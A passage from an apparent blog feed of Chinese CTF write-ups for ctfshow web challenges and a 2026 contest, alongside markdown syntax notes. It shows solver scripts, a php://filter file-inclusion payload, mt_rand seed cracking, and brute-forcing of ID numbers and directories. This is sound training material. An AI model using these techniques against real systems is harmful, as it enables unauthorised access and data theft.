class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">if(isset($_GET[&#x27;token&#x27;]))&#123;</span><br><span class="line">    $token = md5($_GET[&#x27;token&#x27;]);</span><br><span class="line">    if(substr($token, 1,1)===substr($token, 14,1) &amp;&amp; substr($token, 14,1) ===substr($token, 17,1))&#123;</span><br><span class="line">        if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1)))&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>GET一个参数token，然后转化为md5值，要求md5值某些位数满足一些条件就输出flag</p><p>运行脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">def solve():</span><br><span class="line">    # 暴力破解：尝试从 0 开始的数字字符串</span><br><span class="line">    for i in range(10000000):</span><br><span class="line">        token_str = str(i)</span><br><span class="line">        md5_res = hashlib.md5(token_str.encode()).hexdigest()</span><br><span class="line">        </span><br><span class="line">        # 提取关键位置字符</span><br><span class="line">        pos1 = md5_res[1]</span><br><span class="line">        pos14 = md5_res[14]</span><br><span class="line">        pos17 = md5_res[17]</span><br><span class="line">        pos31 = md5_res[31]</span><br><span class="line">        </span><br><span class="line">        # 排除非数字的情况，防止 intval 为 0 或除以 0</span><br><span class="line">        if not (pos1.isdigit() and pos1 != &#x27;0&#x27;):</span><br><span class="line">            continue</span><br><span class="line">            </span><br><span class="line">        # 条件 1: 位置 1, 14, 17 字符相等</span><br><span class="line">        if pos1 == pos14 == pos17:</span><br><span class="line">            # 条件 2: (a+b+c)/a == d =&gt; (a+a+a)/a = 3，所以 d 必须是 &#x27;3&#x27;</span><br><span class="line">            if pos31 == &#x27;3&#x27;:</span><br><span class="line">                print(f&quot;找到匹配的 Token: &#123;token_str&#125;&quot;)</span><br><span class="line">                print(f&quot;对应的 MD5 值: &#123;md5_res&#125;&quot;)</span><br><span class="line">                print(f&quot;Payload: ?token=&#123;token_str&#125;&quot;)</span><br><span class="line">                return</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    solve()</span><br></pre></td></tr></table></figure><p>得出来的结果为422，还有其他的，如3j</p><p>payload：</p><blockquote><p>?token&#x3D;422 </p></blockquote><h2>web24</h2><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">if(isset($_GET[&#x27;r&#x27;]))&#123;</span><br><span class="line">    $r = $_GET[&#x27;r&#x27;];</span><br><span class="line">    mt_srand(372619038);</span><br><span class="line">    if(intval($r)===intval(mt_rand()))&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    echo system(&#x27;cat /proc/version&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>GET一个参数r，生成一个随机数与其比较。由于之前使用了 <code>mt_srand</code> 设置了固定的种子，生成的随机数是伪随机的。</p><p>运行脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(372619038);</span><br><span class="line">$target_value = mt_rand();</span><br><span class="line">echo &quot;?r=&quot; . $target_value;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里得到?r&#x3D;999695185</p><p>传参，没回显，不对</p><blockquote><p>[!note]</p><p>PHP 的 mt_rand() 在不同版本（PHP 5.2 - 7.0 与 PHP 7.1+）之间算法有细微调整。</p></blockquote><p>刚刚使用的是PHP5.5.9，下面切换成7.3.4再试试</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20260118011525673.png" alt="image-20260117230743505"></p><p>得到?r&#x3D;1155388967</p><p>传参，得到flag</p><h2>web25</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">if(isset($_GET[&#x27;r&#x27;]))&#123;</span><br><span class="line">    $r = $_GET[&#x27;r&#x27;];</span><br><span class="line">    mt_srand(hexdec(substr(md5($flag), 0,8)));</span><br><span class="line">    $rand = intval($r)-intval(mt_rand());</span><br><span class="line">    if((!$rand))&#123;</span><br><span class="line">        if($_COOKIE[&#x27;token&#x27;]==(mt_rand()+mt_rand()))&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo $rand;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    echo system(&#x27;cat /proc/version&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一题的种子也是固定的，然后当我传参进去，如果值和种子不一样，会输出相减后的差，这样当我们输入0进去后，就能获取第一个生成随机数的相反数，再使用<a href="https://www.openwall.com/php_mt_seed/">工具</a>爆破出种子的值。</p><p>当Cookie中token等于第二和第三个随机数相加的值，就会输出flag。</p><blockquote><p>?r&#x3D;0</p></blockquote><p>得到 -1862750894</p><p>使用<a href="https://www.openwall.com/php_mt_seed/">php_mt_seed</a></p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20260118011525674.png" alt="image-20260118001424694"></p><p>值我们选择 3953760046(这里要一个一个试PHP版本为7.1.0+的值)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(3953760046);</span><br><span class="line">mt_rand();</span><br><span class="line">echo mt_rand() + mt_rand();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>结果为 3163022853</p><blockquote><p>?r&#x3D;1862750894   设置Cookie：token&#x3D;3163022853</p></blockquote><p>得到flag<img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20260118011525675.png" alt="image-20260118002139983"></p><blockquote><p>[!caution]</p><p>这道题的种子值会变</p></blockquote><h2>web26</h2><p>把抓到的包重发就得到flag了</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20260118011525676.png" alt="image-20260118003156675"></p><h2>web27</h2><p><del>这教务系统</del></p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20260118011525677.png" alt="image-20260118003406452"></p><p>下载录取名单</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20260118011525678.png" alt="image-20260118003628943"></p><p>打开录取查询</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20260118011525679.png" alt="image-20260118003858065"></p><p>要干什么很明显了，打开BP爆破身份证号</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20260118011525680.png" alt="image-20260118005942642"></p><p>身份证号为：621022199002015237</p><p>查询后得知学号和密码，登录后获得flag</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20260118011525681.png" alt="image-20260118004752510"></p><h2>web28</h2><p>爆破目录</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20260118011525682.png" alt="image-20260118011230108"></p><p>得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20260118011525683.png" alt="image-20260118011414553"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>markdown语法学习</title>
      <link href="/2026/01/16/md%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/"/>
      <url>/2026/01/16/md%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2>markdown语法</h2><h3>1. 文本样式与结构</h3><table><thead><tr><th><strong>功能</strong></th><th><strong>语法示例</strong></th><th><strong>效果</strong></th></tr></thead><tbody><tr><td><strong>标题</strong></td><td><code># 一级</code> … <code>###### 六级</code></td><td>不同层级的标题</td></tr><tr><td><strong>加粗</strong></td><td><code>**文字**</code></td><td><strong>文字</strong></td></tr><tr><td><strong>斜体</strong></td><td><code>*文字*</code></td><td><em>文字</em></td></tr><tr><td><strong>删除线</strong></td><td><code>~~文字~~</code></td><td><del>文字</del></td></tr><tr><td><strong>引用</strong></td><td><code>&gt; 引用内容</code> 、<code>&gt;&gt; 嵌套内容</code></td><td>形成引用区块</td></tr><tr><td><strong>分割线</strong></td><td><code>---</code></td><td>水平分割线</td></tr></tbody></table><h3>2. 列表与任务</h3><ul><li><strong>无序列表</strong>：使用 <code>-</code> 或 <code>*</code> 开头。</li><li><strong>有序列表</strong>：使用 <code>1.</code> 开头。</li><li><strong>任务列表</strong>：使用 <code>- [ ]</code> (未完成) 或 <code>- [x]</code> (已完成)。</li></ul><h3>3. 链接与图片</h3><ul><li><strong>链接</strong>：<code>[显示文本](URL地址)</code></li><li><strong>图片</strong>：<code>![替代文字](图片地址)</code></li></ul><h3>4.代码语法</h3><ul><li><strong>代码块</strong>：`中间输入代码`</li><li><strong>代码段</strong>：`&#96;&#96; &#96;&#96;&#96;</li></ul><h3>5.Callout</h3><p><strong>Callout</strong>（通常被称为“提示框”或“注记块”）是 Markdown 的一种高级扩展语法。它最初由 GitHub 和 Microsoft Learn 推广，现在已成为 <strong>Obsidian</strong>、<strong>Notion</strong> 等笔记软件的核心功能，用于创建视觉上醒目的提示、警告或建议。</p><table><thead><tr><th><strong>类型关键词</strong></th><th><strong>视觉效果描述</strong></th><th><strong>适用场景</strong></th></tr></thead><tbody><tr><td><code>&gt; [!NOTE]</code></td><td>蓝色 &#x2F; 铅笔图标</td><td>补充说明、一般笔记</td></tr><tr><td><code>&gt; [!TIP]</code></td><td>绿色 &#x2F; 灯泡图标</td><td>技巧、建议、更好的做法</td></tr><tr><td><code>&gt; [!IMPORTANT]</code></td><td>紫色 &#x2F; 感叹号图标</td><td>关键信息、核心重点</td></tr><tr><td><code>&gt; [!WARNING]</code></td><td>橙色 &#x2F; 三角警告图标</td><td>需要注意的潜在风险</td></tr><tr><td><code>&gt; [!CAUTION]</code></td><td>红色 &#x2F; 停止图标</td><td>极危险、可能导致错误的操作</td></tr></tbody></table><h3>6.思维导图</h3><p><a href="https://markmap.js.org/">https://markmap.js.org</a></p><p>通过markdown来生成思维导图，挺实用的</p><h2>KaTeX 数学公式语法</h2><p>KaTeX 是一个快速的数学公式渲染引擎，其语法与 LaTeX 基本一致。</p><p>官网文档：<a href="https://katex.org/docs/supported.html#math-operators">https://katex.org/docs/supported.html#math-operators</a></p><p>写公式很有帮助</p><h3>1. 基础布局</h3><table><thead><tr><th align="left">功能</th><th align="left">语法</th><th align="left">效果</th></tr></thead><tbody><tr><td align="left">分式</td><td align="left"><code>\frac&#123;a&#125;&#123;b&#125;</code></td><td align="left">$\frac{a}{b}$</td></tr><tr><td align="left">根号</td><td align="left"><code>\sqrt[n]&#123;x&#125;</code></td><td align="left">$\sqrt[n]{x}$</td></tr><tr><td align="left">上下标</td><td align="left"><code>x^&#123;2&#125;_&#123;i&#125;</code></td><td align="left">$x^{2}_{i}$</td></tr><tr><td align="left">向量&#x2F;均值</td><td align="left"><code>\vec&#123;a&#125;, \bar&#123;x&#125;, \hat&#123;y&#125;</code></td><td align="left">$\vec{a}, \bar{x}, \hat{y}$</td></tr></tbody></table><hr><h3>2. 常用符号</h3><h4>希腊字母</h4><ul><li><code>\alpha \beta \gamma \delta</code> -&gt; $\alpha \beta \gamma \delta$</li><li><code>\theta \lambda \pi \omega</code> -&gt; $\theta \lambda \pi \omega$</li><li><code>\Delta \Omega \Phi</code> -&gt; $\Delta \Omega \Phi$</li></ul><h4>运算符</h4><ul><li>算术：<code>\times \div \pm \mp</code> -&gt; $\times \div \pm \mp$</li><li>比较：<code>\le \ge \ne \approx \equiv</code> -&gt; $\le \ge \ne \approx \equiv$</li><li>集合：<code>\in \notin \cup \cap \subset \subseteq</code> -&gt; $\in \notin \cup \cap \subset \subseteq$</li><li>逻辑：<code>\forall \exists \neg \implies \iff</code> -&gt; $\forall \exists \neg \implies \iff$</li></ul><h4>微积分与极限</h4><ul><li><code>\sum_&#123;i=1&#125;^&#123;n&#125;</code> -&gt; $\sum_{i&#x3D;1}^{n}$</li><li><code>\int_&#123;0&#125;^&#123;\infty&#125; f(x) dx</code> -&gt; $\int_{0}^{\infty} f(x) dx$</li><li><code>\lim_&#123;x \to 0&#125;</code> -&gt; $\lim_{x \to 0}$</li><li><code>\partial \nabla \infty</code> -&gt; $\partial \nabla \infty$</li></ul><hr><h3>3. 矩阵与环境</h3><h4>矩阵示例</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$$</span><br><span class="line">\begin&#123;pmatrix&#125;</span><br><span class="line">  1 &amp; 0 \\</span><br><span class="line">  0 &amp; 1</span><br><span class="line">\end&#123;pmatrix&#125;</span><br><span class="line">$$</span><br></pre></td></tr></table></figure><p>$$<br>\begin{pmatrix}<br>  1 &amp; 0 \<br>  0 &amp; 1<br>\end{pmatrix}<br>$$</p><h4>分段函数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$$</span><br><span class="line">f(x) = \begin&#123;cases&#125;</span><br><span class="line">  x, &amp; \text&#123;if &#125; x &gt; 0 \\</span><br><span class="line">  0, &amp; \text&#123;if &#125; x \le 0</span><br><span class="line">\end&#123;cases&#125;</span><br><span class="line">$$</span><br></pre></td></tr></table></figure><p>$$<br>f(x) &#x3D; \begin{cases}<br>  x, &amp; \text{if } x &gt; 0 \<br>  0, &amp; \text{if } x \le 0<br>\end{cases}<br>$$</p><h4>多行对齐 (Aligned)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$$</span><br><span class="line">\begin&#123;aligned&#125;</span><br><span class="line">  (a+b)^2 &amp;= a^2 + 2ab + b^2 \\</span><br><span class="line">          &amp;= a^2 + b^2 + 2ab</span><br><span class="line">\end&#123;aligned&#125;</span><br><span class="line">$$</span><br></pre></td></tr></table></figure><p>$$<br>\begin{aligned}<br>  (a+b)^2 &amp;&#x3D; a^2 + 2ab + b^2 \<br>          &amp;&#x3D; a^2 + b^2 + 2ab<br>\end{aligned}</p><h2>$$</h2><h3>4. 字体样式</h3><ul><li><code>\mathbb&#123;R&#125;</code> -&gt; $\mathbb{R}$ (实数集)</li><li><code>\mathcal&#123;L&#125;</code> -&gt; $\mathcal{L}$ (拉普拉斯变换&#x2F;花体)</li><li><code>\mathbf&#123;v&#125;</code> -&gt; $\mathbf{v}$ (粗体向量)</li><li><code>\text&#123;文字&#125;</code> -&gt; $\text{在公式中插入普通文字}$</li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 语法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFSHOW-2026元旦跨年欢乐赛</title>
      <link href="/2026/01/09/cs2026/"/>
      <url>/2026/01/09/cs2026/</url>
      
        <content type="html"><![CDATA[<p>复现环境:<a href="https://ctf.show/competitions/cs2026_replay">https://ctf.show/competitions/cs2026_replay</a></p><h2>热身签到</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">54515552545455515456547055555566545654495548554855575370515051485150515453705555545755525456537054515551515051485150515450495568</span><br></pre></td></tr></table></figure><p>一共128位，且每两位都在ASCII码范围，写一个脚本解码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flag = &#x27;54515552545455515456547055555566545654495548554855575370515051485150515453705555545755525456537054515551515051485150515450495568&#x27;</span><br><span class="line">decode_flag = &#x27;&#x27;</span><br><span class="line">for i in range(0,len(flag),2):</span><br><span class="line">    temp = flag[i:i+2]</span><br><span class="line">    decode_flag += chr(int(temp))</span><br><span class="line">print(decode_flag)</span><br></pre></td></tr></table></figure><p>得出来结果为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">63746673686F777B68617070795F323032365F776974685F637332303236217D</span><br></pre></td></tr></table></figure><p>看起来像十六进制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = bytes.fromhex(decode_flag).decode(&#x27;utf-8&#x27;)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure><p>得到flag：</p><blockquote><p>ctfshow{happy_2026_with_cs2026!}</p></blockquote><h2>HappySong</h2><p>将下载的drum_bits.wav拖到Audacity看一下</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20260110154929137.png" alt="image-20260109140501752"></p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20260110154929138.png" alt="image-20260109140345836"></p><p>很明显，一个0一个1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">import wave</span><br><span class="line">import struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def solve_drum_frequency():</span><br><span class="line">    filename = &#x27;drum_bits.wav&#x27;</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        f = wave.open(filename, &#x27;rb&#x27;)</span><br><span class="line">        params = f.getparams()</span><br><span class="line">        nchannels, sampwidth, framerate, nframes = params[:4]</span><br><span class="line">        str_data = f.readframes(nframes)</span><br><span class="line">        f.close()</span><br><span class="line">    except:</span><br><span class="line">        print(&quot;[-] 找不到文件或格式错误&quot;)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    # 转为整数列表</span><br><span class="line">    total_samples = len(str_data) // 2</span><br><span class="line">    wave_data = struct.unpack(&quot;&lt;&quot; + &quot;h&quot; * total_samples, str_data)</span><br><span class="line"></span><br><span class="line">    # 参数设置</span><br><span class="line">    step = int(framerate * 0.1)  # 每个鼓点大约占用的采样数 (0.1秒)</span><br><span class="line">    silence_threshold = 2000  # 噪音门限，用来定位鼓点开始的位置</span><br><span class="line"></span><br><span class="line">    beat_stats = []  # 存储每个鼓点的特征（过零率）</span><br><span class="line">    i = 0</span><br><span class="line">    length = len(wave_data)</span><br><span class="line"></span><br><span class="line">    print(&quot;[*] 正在分析波形频率特征...&quot;)</span><br><span class="line"></span><br><span class="line">    while i &lt; length - step:</span><br><span class="line">        val = abs(wave_data[i])</span><br><span class="line"></span><br><span class="line">        # 1. 发现鼓点开始（音量超过静音阈值）</span><br><span class="line">        if val &gt; silence_threshold:</span><br><span class="line">            # 截取这一段鼓点的音频数据</span><br><span class="line">            chunk = wave_data[i: i + step]</span><br><span class="line"></span><br><span class="line">            # 2. 计算过零率 (Zero Crossing Rate) - 核心逻辑</span><br><span class="line">            # 统计这一段波形穿过 0 轴的次数，次数越多说明频率越高</span><br><span class="line">            zero_crossings = 0</span><br><span class="line">            for k in range(len(chunk) - 1):</span><br><span class="line">                # 如果相邻两个点符号相反（一个正一个负），就是穿过了一次 0</span><br><span class="line">                if chunk[k] * chunk[k + 1] &lt; 0:</span><br><span class="line">                    zero_crossings += 1</span><br><span class="line"></span><br><span class="line">            beat_stats.append(zero_crossings)</span><br><span class="line"></span><br><span class="line">            # 跳过这段，防止重复检测</span><br><span class="line">            i += step</span><br><span class="line">        else:</span><br><span class="line">            i += 1</span><br><span class="line"></span><br><span class="line">    if not beat_stats:</span><br><span class="line">        print(&quot;[-] 未检测到鼓点，请降低 silence_threshold&quot;)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    # 3. 区分 0 和 1</span><br><span class="line">    # 计算平均过零率，作为分界线</span><br><span class="line">    avg_zcr = sum(beat_stats) / len(beat_stats)</span><br><span class="line">    print(f&quot;[*] 捕捉到 &#123;len(beat_stats)&#125; 个鼓点。平均过零率: &#123;avg_zcr:.2f&#125;&quot;)</span><br><span class="line"></span><br><span class="line">    binary_str = &quot;&quot;</span><br><span class="line">    for zcr in beat_stats:</span><br><span class="line">        # 如果过零率高 -&gt; 是右边那个密集的波形 -&gt; 假设为 1</span><br><span class="line">        if zcr &gt; avg_zcr:</span><br><span class="line">            binary_str += &quot;1&quot;</span><br><span class="line">        # 如果过零率低 -&gt; 是左边那个稀疏的波形 -&gt; 假设为 0</span><br><span class="line">        else:</span><br><span class="line">            binary_str += &quot;0&quot;</span><br><span class="line"></span><br><span class="line">    print(f&quot;\n[+] 生成二进制串:\n&#123;binary_str&#125;&quot;)</span><br><span class="line"></span><br><span class="line">    # 4. 解码函数</span><br><span class="line">    def decode(b_str):</span><br><span class="line">        try:</span><br><span class="line">            chars = []</span><br><span class="line">            for k in range(0, len(b_str), 8):</span><br><span class="line">                byte = b_str[k:k + 8]</span><br><span class="line">                chars.append(chr(int(byte, 2)))</span><br><span class="line">            return &quot;&quot;.join(chars)</span><br><span class="line">        except:</span><br><span class="line">            return &quot;ERROR&quot;</span><br><span class="line"></span><br><span class="line">    # 尝试解码</span><br><span class="line">    # 假设：密集的(High Freq) = 1, 稀疏的(Low Freq) = 0</span><br><span class="line">    print(&quot;\n[+] 解码尝试 (密集=1, 稀疏=0):&quot;)</span><br><span class="line">    res1 = decode(binary_str)</span><br><span class="line">    print(res1)</span><br><span class="line"></span><br><span class="line">    # 假设：密集的(High Freq) = 0, 稀疏的(Low Freq) = 1</span><br><span class="line">    print(&quot;\n[+] 解码尝试 (密集=0, 稀疏=1):&quot;)</span><br><span class="line">    inverted_str = &quot;&quot;.join([&#x27;0&#x27; if x == &#x27;1&#x27; else &#x27;1&#x27; for x in binary_str])</span><br><span class="line">    res2 = decode(inverted_str)</span><br><span class="line">    print(res2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    solve_drum_frequency()</span><br></pre></td></tr></table></figure><h2>Happy2026</h2><p>题目：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$happy = $_GET[&#x27;happy&#x27;];</span><br><span class="line">$new = $_GET[&#x27;new&#x27;];</span><br><span class="line">$year = $_GET[&#x27;year&#x27;];</span><br><span class="line"></span><br><span class="line">if($year==2026 &amp;&amp; $year!==2026 &amp;&amp; is_numeric($year))&#123;</span><br><span class="line">    include $happy[$new[$year]];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>考的是php的弱类型和数组嵌套</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?year=2026&amp;new[2026]=a&amp;happy[a]=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>得到结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgJGZsYWc9J2N0ZnNob3d7NzMwMDI4YzktN2YzNi00YmQ4LTliNGItYWYxYTJiNzU5MGQ1fSc7Cg==</span><br></pre></td></tr></table></figure><p>解码一下</p><blockquote><p>ctfshow{730028c9-7f36-4bd8-9b4b-af1a2b7590d5}</p></blockquote><h2>happyEmoji</h2><p>先看一下描述</p><blockquote><p>这天小狐狸和一个很好看的姑娘成了好朋友，他很开心。于是他用她发给他的表情写了一段话，分享给更多的朋友，现在大家都开心了。 1. 每一串是一个字母 2. 有眼睛就能做</p></blockquote><p>这道题误以为是简单的看0和1了，最后没做出来。</p><p><strong>我的错误思路：</strong></p><p>导到ps看一下，<img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20260110154929139.png" alt="PixPin_2026-01-04_02-43-29"></p><p>一共有四个部分，然后每个部分截取两帧出来，然后叠加相消得到，四张这样的图片，然后写代码读取。</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20260110154929140.png" alt="flag1"></p><p>最后没做出来</p><p>看了一下官方的<a href="https://ctf-show.feishu.cn/wiki/RZQ8whrVMib7xnkTerec5axOno2">wp</a>，发现跟转速还有关。</p><p>贴个官方脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 